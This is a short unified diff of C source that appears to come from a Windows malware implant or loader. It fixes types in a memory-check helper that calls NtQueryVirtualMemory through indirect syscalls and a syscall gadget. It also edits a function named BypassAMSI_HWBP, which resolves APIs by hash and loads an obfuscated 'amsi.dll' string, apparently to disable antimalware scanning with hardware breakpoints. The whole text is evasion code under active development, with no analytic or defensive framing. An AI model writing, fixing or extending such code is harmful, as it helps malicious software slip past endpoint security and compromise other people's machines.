@@ -13,7 +13,7 @@ extern API_TABLE g_ApiTable;
 static BOOL SafeMemAccessCheck(PVOID addr, SIZE_T size) {
     MEMORY_BASIC_INFORMATION mbi = {0};
     NTSTATUS status = InvokeSyscall(g_ApiTable.syscalls.NtQueryVirtualMemory.ssn,
-        g_SyscallGadget, (HANDLE)-1, addr, MemoryBasicInformation, &mbi, sizeof(mbi), NULL);
+        g_SyscallGadget, (HANDLE)-1, addr, (ULONG)0, &mbi, sizeof(mbi), NULL);
     return (status == 0 && (mbi.State == MEM_COMMIT));
 }
 
@@ -231,7 +231,7 @@ static BOOL BypassAMSI_HWBP() {
     }
 
     if (!hAmsi) {
-        PVOID hKernel32 = GetModuleBaseByHash(HASH_KERNEL32);
+        HMODULE hKernel32 = (HMODULE)GetModuleBaseByHash(HASH_KERNEL32);
         typedef HMODULE (WINAPI *LoadLibraryW_t)(LPCWSTR);
         LoadLibraryW_t pLLW = (LoadLibraryW_t)ResolveApiByHash(hKernel32, HASH_LoadLibraryW);
         hAmsi = pLLW(OBFUSCATE(L"amsi.dll"));
